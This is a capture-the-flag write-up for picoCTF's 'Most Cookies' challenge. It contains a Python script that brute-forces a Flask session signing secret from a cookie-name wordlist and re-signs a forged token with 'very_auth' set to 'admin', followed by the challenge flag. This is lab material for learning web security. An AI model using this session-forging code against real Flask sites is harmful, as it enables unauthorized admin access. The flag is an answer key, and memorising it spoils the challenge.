<h1>Most Cookies</h1>
<h3>Description</h3>
<pre>
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! <a href='https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py'>server.py</a> http://mercury.picoctf.net:65344/
</pre>
<h3>Solution</h3>
<p>Bruteforce secret Flask session cookie lalu signing dengan payload '{"very_auth":"admin"}'</p>

```python3
import hashlib
import json
from base64 import b64decode
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired
from flask.sessions import TaggedJSONSerializer

secret_key = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
token = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aPOLZQ.DxCgTXlqQV2XrDVBksXx4DdfZmI"
def bruteforce(token, secret_key):
    for secret in secret_key:
        serializer = TaggedJSONSerializer()
        s = URLSafeTimedSerializer(
            secret,
            salt='cookie-session',               
            serializer=serializer,
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
        )
        try:
            data = s.loads(token)
            print("Berhasil decode:", data)
            return secret,s
        except:
            pass
        
secret,s = bruteforce(token, secret_key)
data = json.loads(b64decode(token.split('.')[0]))
data['very_auth'] = 'admin'
token = s.dumps(data)
print(token)
```
<h3>Flag</h3>
<pre>
picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}
</pre>
